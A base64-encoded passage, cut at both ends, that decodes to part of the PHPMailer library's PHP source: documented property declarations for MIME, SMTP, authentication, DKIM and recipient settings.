AgICogQGxpbmsgaHR0cDovL2tpZ2tvbnN1bHQuc2UvaUNhbGNyZWF0b3IvDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJEljYWwgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBjb21wbGV0ZSBjb21waWxlZCBNSU1FIG1lc3NhZ2UgYm9keS4NCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOw0KDQogICAgLyoqDQogICAgICogVGhlIGNvbXBsZXRlIGNvbXBpbGVkIE1JTUUgbWVzc2FnZSBoZWFkZXJzLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJE1JTUVIZWFkZXIgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIEV4dHJhIGhlYWRlcnMgdGhhdCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4uDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkbWFpbEhlYWRlciA9ICcnOw0KDQogICAgLyoqDQogICAgICogV29yZC13cmFwIHRoZSBtZXNzYWdlIGJvZHkgdG8gdGhpcyBudW1iZXIgb2YgY2hhcnMuDQogICAgICogU2V0IHRvIDAgdG8gbm90IHdyYXAuIEEgdXNlZnVsIHZhbHVlIGhlcmUgaXMgNzgsIGZvciBSRkMyODIyIHNlY3Rpb24gMi4xLjEgY29tcGxpYW5jZS4NCiAgICAgKiBAdmFyIGludGVnZXINCiAgICAgKi8NCiAgICBwdWJsaWMgJFdvcmRXcmFwID0gMDsNCg0KICAgIC8qKg0KICAgICAqIFdoaWNoIG1ldGhvZCB0byB1c2UgdG8gc2VuZCBtYWlsLg0KICAgICAqIE9wdGlvbnM6ICJtYWlsIiwgInNlbmRtYWlsIiwgb3IgInNtdHAiLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRNYWlsZXIgPSAnbWFpbCc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgcGF0aCB0byB0aGUgc2VuZG1haWwgcHJvZ3JhbS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkU2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsNCg0KICAgIC8qKg0KICAgICAqIFdoZXRoZXIgbWFpbCgpIHVzZXMgYSBmdWxseSBzZW5kbWFpbC1jb21wYXRpYmxlIE1UQS4NCiAgICAgKiBPbmUgd2hpY2ggc3VwcG9ydHMgc2VuZG1haWwncyAiLW9pIC1mIiBvcHRpb25zLg0KICAgICAqIEB2YXIgYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyAkVXNlU2VuZG1haWxPcHRpb25zID0gdHJ1ZTsNCg0KICAgIC8qKg0KICAgICAqIFBhdGggdG8gUEhQTWFpbGVyIHBsdWdpbnMuDQogICAgICogVXNlZnVsIGlmIHRoZSBTTVRQIGNsYXNzIGlzIG5vdCBpbiB0aGUgUEhQIGluY2x1ZGUgcGF0aC4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBkZXByZWNhdGVkIFNob3VsZCBub3QgYmUgbmVlZGVkIG5vdyB0aGVyZSBpcyBhbiBhdXRvbG9hZGVyLg0KICAgICAqLw0KICAgIHB1YmxpYyAkUGx1Z2luRGlyID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgZW1haWwgYWRkcmVzcyB0aGF0IGEgcmVhZGluZyBjb25maXJtYXRpb24gc2hvdWxkIGJlIHNlbnQgdG8sIGFsc28ga25vd24gYXMgcmVhZCByZWNlaXB0Lg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRDb25maXJtUmVhZGluZ1RvID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgaG9zdG5hbWUgdG8gdXNlIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBhbmQgYXMgZGVmYXVsdCBIRUxPIHN0cmluZy4NCiAgICAgKiBJZiBlbXB0eSwgUEhQTWFpbGVyIGF0dGVtcHRzIHRvIGZpbmQgb25lIHdpdGgsIGluIG9yZGVyLA0KICAgICAqICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLCBnZXRob3N0bmFtZSgpLCBwaHBfdW5hbWUoJ24nKSwgb3IgdGhlIHZhbHVlDQogICAgICogJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJEhvc3RuYW1lID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBBbiBJRCB0byBiZSB1c2VkIGluIHRoZSBNZXNzYWdlLUlEIGhlYWRlci4NCiAgICAgKiBJZiBlbXB0eSwgYSB1bmlxdWUgaWQgd2lsbCBiZSBnZW5lcmF0ZWQuDQogICAgICogWW91IGNhbiBzZXQgeW91ciBvd24sIGJ1dCBpdCBtdXN0IGJlIGluIHRoZSBmb3JtYXQgIjxpZEBkb21haW4+IiwNCiAgICAgKiBhcyBkZWZpbmVkIGluIFJGQzUzMjIgc2VjdGlvbiAzLjYuNCBvciBpdCB3aWxsIGJlIGlnbm9yZWQuDQogICAgICogQHNlZSBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMiNzZWN0aW9uLTMuNi40DQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJE1lc3NhZ2VJRCA9ICcnOw0KDQogICAgLyoqDQogICAgICogVGhlIG1lc3NhZ2UgRGF0ZSB0byBiZSB1c2VkIGluIHRoZSBEYXRlIGhlYWRlci4NCiAgICAgKiBJZiBlbXB0eSwgdGhlIGN1cnJlbnQgZGF0ZSB3aWxsIGJlIGFkZGVkLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRNZXNzYWdlRGF0ZSA9ICcnOw0KDQogICAgLyoqDQogICAgICogU01UUCBob3N0cy4NCiAgICAgKiBFaXRoZXIgYSBzaW5nbGUgaG9zdG5hbWUgb3IgbXVsdGlwbGUgc2VtaWNvbG9uLWRlbGltaXRlZCBob3N0bmFtZXMuDQogICAgICogWW91IGNhbiBhbHNvIHNwZWNpZnkgYSBkaWZmZXJlbnQgcG9ydA0KICAgICAqIGZvciBlYWNoIGhvc3QgYnkgdXNpbmcgdGhpcyBmb3JtYXQ6IFtob3N0bmFtZTpwb3J0XQ0KICAgICAqIChlLmcuICJzbXRwMS5leGFtcGxlLmNvbToyNTtzbXRwMi5leGFtcGxlLmNvbSIpLg0KICAgICAqIFlvdSBjYW4gYWxzbyBzcGVjaWZ5IGVuY3J5cHRpb24gdHlwZSwgZm9yIGV4YW1wbGU6DQogICAgICogKGUuZy4gInRsczovL3NtdHAxLmV4YW1wbGUuY29tOjU4Nztzc2w6Ly9zbXRwMi5leGFtcGxlLmNvbTo0NjUiKS4NCiAgICAgKiBIb3N0cyB3aWxsIGJlIHRyaWVkIGluIG9yZGVyLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRIb3N0ID0gJ2xvY2FsaG9zdCc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgZGVmYXVsdCBTTVRQIHNlcnZlciBwb3J0Lg0KICAgICAqIEB2YXIgaW50ZWdlcg0KICAgICAqIEBUT0RPIFdoeSBpcyB0aGlzIG5lZWRlZCB3aGVuIHRoZSBTTVRQIGNsYXNzIHRha2VzIGNhcmUgb2YgaXQ/DQogICAgICovDQogICAgcHVibGljICRQb3J0ID0gMjU7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgU01UUCBIRUxPIG9mIHRoZSBtZXNzYWdlLg0KICAgICAqIERlZmF1bHQgaXMgJEhvc3RuYW1lLiBJZiAkSG9zdG5hbWUgaXMgZW1wdHksIFBIUE1haWxlciBhdHRlbXB0cyB0byBmaW5kDQogICAgICogb25lIHdpdGggdGhlIHNhbWUgbWV0aG9kIGRlc2NyaWJlZCBhYm92ZSBmb3IgJEhvc3RuYW1lLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRIb3N0bmFtZQ0KICAgICAqLw0KICAgIHB1YmxpYyAkSGVsbyA9ICcnOw0KDQogICAgLyoqDQogICAgICogV2hhdCBraW5kIG9mIGVuY3J5cHRpb24gdG8gdXNlIG9uIHRoZSBTTVRQIGNvbm5lY3Rpb24uDQogICAgICogT3B0aW9uczogJycsICdzc2wnIG9yICd0bHMnDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJFNNVFBTZWN1cmUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFdoZXRoZXIgdG8gZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGF1dG9tYXRpY2FsbHkgaWYgYSBzZXJ2ZXIgc3VwcG9ydHMgaXQsDQogICAgICogZXZlbiBpZiBgU01UUFNlY3VyZWAgaXMgbm90IHNldCB0byAndGxzJy4NCiAgICAgKiBCZSBhd2FyZSB0aGF0IGluIFBIUCA+PSA1LjYgdGhpcyByZXF1aXJlcyB0aGF0IHRoZSBzZXJ2ZXIncyBjZXJ0aWZpY2F0ZXMgYXJlIHZhbGlkLg0KICAgICAqIEB2YXIgYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyAkU01UUEF1dG9UTFMgPSB0cnVlOw0KDQogICAgLyoqDQogICAgICogV2hldGhlciB0byB1c2UgU01UUCBhdXRoZW50aWNhdGlvbi4NCiAgICAgKiBVc2VzIHRoZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQgcHJvcGVydGllcy4NCiAgICAgKiBAdmFyIGJvb2xlYW4NCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JFVzZXJuYW1lDQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRQYXNzd29yZA0KICAgICAqLw0KICAgIHB1YmxpYyAkU01UUEF1dGggPSBmYWxzZTsNCg0KICAgIC8qKg0KICAgICAqIE9wdGlvbnMgYXJyYXkgcGFzc2VkIHRvIHN0cmVhbV9jb250ZXh0X2NyZWF0ZSB3aGVuIGNvbm5lY3RpbmcgdmlhIFNNVFAuDQogICAgICogQHZhciBhcnJheQ0KICAgICAqLw0KICAgIHB1YmxpYyAkU01UUE9wdGlvbnMgPSBhcnJheSgpOw0KDQogICAgLyoqDQogICAgICogU01UUCB1c2VybmFtZS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkVXNlcm5hbWUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFNNVFAgcGFzc3dvcmQuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJFBhc3N3b3JkID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBTTVRQIGF1dGggdHlwZS4NCiAgICAgKiBPcHRpb25zIGFyZSBDUkFNLU1ENSwgTE9HSU4sIFBMQUlOLCBOVExNLCBYT0FVVEgyLCBhdHRlbXB0ZWQgaW4gdGhhdCBvcmRlciBpZiBub3Qgc3BlY2lmaWVkDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJEF1dGhUeXBlID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBTTVRQIHJlYWxtLg0KICAgICAqIFVzZWQgZm9yIE5UTE0gYXV0aA0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRSZWFsbSA9ICcnOw0KDQogICAgLyoqDQogICAgICogU01UUCB3b3Jrc3RhdGlvbi4NCiAgICAgKiBVc2VkIGZvciBOVExNIGF1dGgNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkV29ya3N0YXRpb24gPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBTTVRQIHNlcnZlciB0aW1lb3V0IGluIHNlY29uZHMuDQogICAgICogRGVmYXVsdCBvZiA1IG1pbnV0ZXMgKDMwMHNlYykgaXMgZnJvbSBSRkMyODIxIHNlY3Rpb24gNC41LjMuMg0KICAgICAqIEB2YXIgaW50ZWdlcg0KICAgICAqLw0KICAgIHB1YmxpYyAkVGltZW91dCA9IDMwMDsNCg0KICAgIC8qKg0KICAgICAqIFNNVFAgY2xhc3MgZGVidWcgb3V0cHV0IG1vZGUuDQogICAgICogRGVidWcgb3V0cHV0IGxldmVsLg0KICAgICAqIE9wdGlvbnM6DQogICAgICogKiBgMGAgTm8gb3V0cHV0DQogICAgICogKiBgMWAgQ29tbWFuZHMNCiAgICAgKiAqIGAyYCBEYXRhIGFuZCBjb21tYW5kcw0KICAgICAqICogYDNgIEFzIDIgcGx1cyBjb25uZWN0aW9uIHN0YXR1cw0KICAgICAqICogYDRgIExvdy1sZXZlbCBkYXRhIG91dHB1dA0KICAgICAqIEB2YXIgaW50ZWdlcg0KICAgICAqIEBzZWUgU01UUDo6JGRvX2RlYnVnDQogICAgICovDQogICAgcHVibGljICRTTVRQRGVidWcgPSAwOw0KDQogICAgLyoqDQogICAgICogSG93IHRvIGhhbmRsZSBkZWJ1ZyBvdXRwdXQuDQogICAgICogT3B0aW9uczoNCiAgICAgKiAqIGBlY2hvYCBPdXRwdXQgcGxhaW4tdGV4dCBhcy1pcywgYXBwcm9wcmlhdGUgZm9yIENMSQ0KICAgICAqICogYGh0bWxgIE91dHB1dCBlc2NhcGVkLCBsaW5lIGJyZWFrcyBjb252ZXJ0ZWQgdG8gYDxicj5gLCBhcHByb3ByaWF0ZSBmb3IgYnJvd3NlciBvdXRwdXQNCiAgICAgKiAqIGBlcnJvcl9sb2dgIE91dHB1dCB0byBlcnJvciBsb2cgYXMgY29uZmlndXJlZCBpbiBwaHAuaW5pDQogICAgICoNCiAgICAgKiBBbHRlcm5hdGl2ZWx5LCB5b3UgY2FuIHByb3ZpZGUgYSBjYWxsYWJsZSBleHBlY3RpbmcgdHdvIHBhcmFtczogYSBtZXNzYWdlIHN0cmluZyBhbmQgdGhlIGRlYnVnIGxldmVsOg0KICAgICAqIDxjb2RlPg0KICAgICAqICRtYWlsLT5EZWJ1Z291dHB1dCA9IGZ1bmN0aW9uKCRzdHIsICRsZXZlbCkge2VjaG8gImRlYnVnIGxldmVsICRsZXZlbDsgbWVzc2FnZTogJHN0ciI7fTsNCiAgICAgKiA8L2NvZGU+DQogICAgICogQHZhciBzdHJpbmd8Y2FsbGFibGUNCiAgICAgKiBAc2VlIFNNVFA6OiREZWJ1Z291dHB1dA0KICAgICAqLw0KICAgIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7DQoNCiAgICAvKioNCiAgICAgKiBXaGV0aGVyIHRvIGtlZXAgU01UUCBjb25uZWN0aW9uIG9wZW4gYWZ0ZXIgZWFjaCBtZXNzYWdlLg0KICAgICAqIElmIHRoaXMgaXMgc2V0IHRvIHRydWUgdGhlbiB0byBjbG9zZSB0aGUgY29ubmVjdGlvbg0KICAgICAqIHJlcXVpcmVzIGFuIGV4cGxpY2l0IGNhbGwgdG8gc210cENsb3NlKCkuDQogICAgICogQHZhciBib29sZWFuDQogICAgICovDQogICAgcHVibGljICRTTVRQS2VlcEFsaXZlID0gZmFsc2U7DQoNCiAgICAvKioNCiAgICAgKiBXaGV0aGVyIHRvIHNwbGl0IG11bHRpcGxlIHRvIGFkZHJlc3NlcyBpbnRvIG11bHRpcGxlIG1lc3NhZ2VzDQogICAgICogb3Igc2VuZCB0aGVtIGFsbCBpbiBvbmUgbWVzc2FnZS4NCiAgICAgKiBPbmx5IHN1cHBvcnRlZCBpbiBgbWFpbGAgYW5kIGBzZW5kbWFpbGAgdHJhbnNwb3J0cywgbm90IGluIFNNVFAuDQogICAgICogQHZhciBib29sZWFuDQogICAgICovDQogICAgcHVibGljICRTaW5nbGVUbyA9IGZhbHNlOw0KDQogICAgLyoqDQogICAgICogU3RvcmFnZSBmb3IgYWRkcmVzc2VzIHdoZW4gU2luZ2xlVG8gaXMgZW5hYmxlZC4NCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQFRPRE8gVGhpcyBzaG91bGQgcmVhbGx5IG5vdCBiZSBwdWJsaWMNCiAgICAgKi8NCiAgICBwdWJsaWMgJFNpbmdsZVRvQXJyYXkgPSBhcnJheSgpOw0KDQogICAgLyoqDQogICAgICogV2hldGhlciB0byBnZW5lcmF0ZSBWRVJQIGFkZHJlc3NlcyBvbiBzZW5kLg0KICAgICAqIE9ubHkgYXBwbGljYWJsZSB3aGVuIHNlbmRpbmcgdmlhIFNNVFAuDQogICAgICogQGxpbmsgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmFyaWFibGVfZW52ZWxvcGVfcmV0dXJuX3BhdGgNCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBvc3RmaXgub3JnL1ZFUlBfUkVBRE1FLmh0bWwgUG9zdGZpeCBWRVJQIGluZm8NCiAgICAgKiBAdmFyIGJvb2xlYW4NCiAgICAgKi8NCiAgICBwdWJsaWMgJGRvX3ZlcnAgPSBmYWxzZTsNCg0KICAgIC8qKg0KICAgICAqIFdoZXRoZXIgdG8gYWxsb3cgc2VuZGluZyBtZXNzYWdlcyB3aXRoIGFuIGVtcHR5IGJvZHkuDQogICAgICogQHZhciBib29sZWFuDQogICAgICovDQogICAgcHVibGljICRBbGxvd0VtcHR5ID0gZmFsc2U7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgZGVmYXVsdCBsaW5lIGVuZGluZy4NCiAgICAgKiBAbm90ZSBUaGUgZGVmYXVsdCByZW1haW5zICINCiIuIFdlIGZvcmNlIENSTEYgd2hlcmUgd2Uga25vdw0KICAgICAqICAgICAgICBpdCBtdXN0IGJlIHVzZWQgdmlhIHNlbGY6OkNSTEYuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJExFID0gIg0KIjsNCg0KICAgIC8qKg0KICAgICAqIERLSU0gc2VsZWN0b3IuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIERLSU0gSWRlbnRpdHkuDQogICAgICogVXN1YWxseSB0aGUgZW1haWwgYWRkcmVzcyB1c2VkIGFzIHRoZSBzb3VyY2Ugb2YgdGhlIGVtYWlsLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRES0lNX2lkZW50aXR5ID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBES0lNIHBhc3NwaHJhc2UuDQogICAgICogVXNlZCBpZiB5b3VyIGtleSBpcyBlbmNyeXB0ZWQuDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOw0KDQogICAgLyoqDQogICAgICogREtJTSBzaWduaW5nIGRvbWFpbiBuYW1lLg0KICAgICAqIEBleGFtcGxlICdleGFtcGxlLmNvbScNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkREtJTV9kb21haW4gPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgZmlsZSBwYXRoLg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRES0lNX3ByaXZhdGUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgc3RyaW5nLg0KICAgICAqIElmIHNldCwgdGFrZXMgcHJlY2VkZW5jZSBvdmVyIGAkREtJTV9wcml2YXRlYC4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyAkREtJTV9wcml2YXRlX3N0cmluZyA9ICcnOw0KDQogICAgLyoqDQogICAgICogQ2FsbGJhY2sgQWN0aW9uIGZ1bmN0aW9uIG5hbWUuDQogICAgICoNCiAgICAgKiBUaGUgZnVuY3Rpb24gdGhhdCBoYW5kbGVzIHRoZSByZXN1bHQgb2YgdGhlIHNlbmQgZW1haWwgYWN0aW9uLg0KICAgICAqIEl0IGlzIGNhbGxlZCBvdXQgYnkgc2VuZCgpIGZvciBlYWNoIGVtYWlsIHNlbnQuDQogICAgICoNCiAgICAgKiBWYWx1ZSBjYW4gYmUgYW55IHBocCBjYWxsYWJsZTogaHR0cDovL3d3dy5waHAubmV0L2lzX2NhbGxhYmxlDQogICAgICoNCiAgICAgKiBQYXJhbWV0ZXJzOg0KICAgICAqICAgYm9vbGVhbiAkcmVzdWx0ICAgICAgICByZXN1bHQgb2YgdGhlIHNlbmQgYWN0aW9uDQogICAgICogICBhcnJheSAgICR0byAgICAgICAgICAgIGVtYWlsIGFkZHJlc3NlcyBvZiB0aGUgcmVjaXBpZW50cw0KICAgICAqICAgYXJyYXkgICAkY2MgICAgICAgICAgICBjYyBlbWFpbCBhZGRyZXNzZXMNCiAgICAgKiAgIGFycmF5ICAgJGJjYyAgICAgICAgICAgYmNjIGVtYWlsIGFkZHJlc3Nlcw0KICAgICAqICAgc3RyaW5nICAkc3ViamVjdCAgICAgICB0aGUgc3ViamVjdA0KICAgICAqICAgc3RyaW5nICAkYm9keSAgICAgICAgICB0aGUgZW1haWwgYm9keQ0KICAgICAqICAgc3RyaW5nICAkZnJvbSAgICAgICAgICBlbWFpbCBhZGRyZXNzIG9mIHNlbmRlcg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHVibGljICRhY3Rpb25fZnVuY3Rpb24gPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFdoYXQgdG8gcHV0IGluIHRoZSBYLU1haWxlciBoZWFkZXIuDQogICAgICogT3B0aW9uczogQW4gZW1wdHkgc3RyaW5nIGZvciBQSFBNYWlsZXIgZGVmYXVsdCwgd2hpdGVzcGFjZSBmb3Igbm9uZSwgb3IgYSBzdHJpbmcgdG8gdXNlDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgJFhNYWlsZXIgPSAnICc7DQoNCiAgICAvKioNCiAgICAgKiBXaGljaCB2YWxpZGF0b3IgdG8gdXNlIGJ5IGRlZmF1bHQgd2hlbiB2YWxpZGF0aW5nIGVtYWlsIGFkZHJlc3Nlcy4NCiAgICAgKiBNYXkgYmUgYSBjYWxsYWJsZSB0byBpbmplY3QgeW91ciBvd24gdmFsaWRhdG9yLCBidXQgdGhlcmUgYXJlIHNldmVyYWwgYnVpbHQtaW4gdmFsaWRhdG9ycy4NCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6dmFsaWRhdGVBZGRyZXNzKCkNCiAgICAgKiBAdmFyIHN0cmluZ3xjYWxsYWJsZQ0KICAgICAqIEBzdGF0aWMNCiAgICAgKi8NCiAgICBwdWJsaWMgc3RhdGljICR2YWxpZGF0b3IgPSAnYXV0byc7DQoNCiAgICAvKioNCiAgICAgKiBBbiBpbnN0YW5jZSBvZiB0aGUgU01UUCBzZW5kZXIgY2xhc3MuDQogICAgICogQHZhciBTTVRQDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHNtdHAgPSBudWxsOw0KDQogICAgLyoqDQogICAgICogVGhlIGFycmF5IG9mICd0bycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4NCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHRvID0gYXJyYXkoKTsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBhcnJheSBvZiAnY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuDQogICAgICogQHZhciBhcnJheQ0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRjYyA9IGFycmF5KCk7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgYXJyYXkgb2YgJ2JjYycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4NCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGJjYyA9IGFycmF5KCk7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgYXJyYXkgb2YgcmVwbHktdG8gbmFtZXMgYW5kIGFkZHJlc3Nlcy4NCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG8gPSBhcnJheSgpOw0KDQogICAgLyoqDQogICAgICogQW4gYXJyYXkgb2YgYWxsIGtpbmRzIG9mIGFkZHJlc3Nlcy4NCiAgICAgKiBJbmNsdWRlcyBhbGwgb2YgJHRvLCAkY2MsICRiY2MNCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JHRvIEBzZWUgUEhQTWFpbGVyOjokY2MgQHNlZSBQSFBNYWlsZXI6OiRiY2MNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsNCg0KICAgIC8qKg0KICAgICAqIEFuIGFycmF5IG9mIG5hbWVzIGFuZCBhZGRyZXNzZXMgcXVldWVkIGZvciB2YWxpZGF0aW9uLg0KICAgICAqIEluIHNlbmQoKSwgdmFsaWQgYW5kIG5vbiBkdXBsaWNhdGUgZW50cmllcyBhcmUgbW92ZWQgdG8gJGFsbF9yZWNpcGllbnRzDQogICAgICogYW5kIG9uZSBvZiAkdG8sICRjYywgb3IgJGJjYy4NCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEBzZWUgUEhQTWFpbGVyOjokdG8gQHNlZSBQSFBNYWlsZXI6OiRjYyBAc2VlIFBIUE1haWxlcjo6JGJjYw0KICAgICAqIEBzZWUgUEhQTWFpbGVyOjokYWxsX3JlY2lwaWVudHMNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJFJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7DQoNCiAgICAvKioNCiAgICAgKiBBbiBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzIHF1ZXVlZCBmb3IgdmFsaWRhdGlvbi4NCiAgICAgKiBJbiBzZW5kKCksIHZhbGlkIGFuZCBub24gZHVwbGljYXRlIGVudHJpZXMgYXJlIG1vdmVkIHRvICRSZXBseVRvLg0KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uDQogICAgICogQHZhciBhcnJheQ0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRSZXBseVRvDQogICAgICovDQogICAgcHJvdGVjdGVkICRSZXBseVRvUXVldWUgPSBhcnJheSgpOw0KDQogICAgLyoqDQogICAgICogVGhlIGFycmF5IG9mIGF0dGFjaG1lbnRzLg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkYXR0YWNobWVudCA9IGFycmF5KCk7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgYXJyYXkgb2YgY3VzdG9tIGhlYWRlcnMuDQogICAgICogQHZhciBhcnJheQ0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBhcnJheSgpOw0KDQogICAgLyoqDQogICAgICogVGhlIG1vc3QgcmVjZW50IE1lc3NhZ2UtSUQgKGluY2x1ZGluZyBhbmd1bGFyIGJyYWNrZXRzKS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRsYXN0TWVzc2FnZUlEID0gJyc7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgbWVzc2FnZSdzIE1JTUUgdHlwZS4NCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRtZXNzYWdlX3R5cGUgPSAnJzsNCg0KICAgIC8qKg0KICAgICAqIFRoZSBhcnJheSBvZiBNSU1FIGJvdW5kYXJ5IHN0cmluZ3MuDQogICAgICogQHZhciBhcnJheQ0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICovDQogICAgcHJvdGVjdGVkICRib3VuZGFyeSA9IGFycmF5KCk7DQoNCiAgICAvKioNCiAgICAgKiBUaGUgYXJyYXkgb2YgYXZhaWxhYmxlIGxhbmd1YWdlcy4NCiAgICAgKiBAdmFyIGFycmF5DQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQg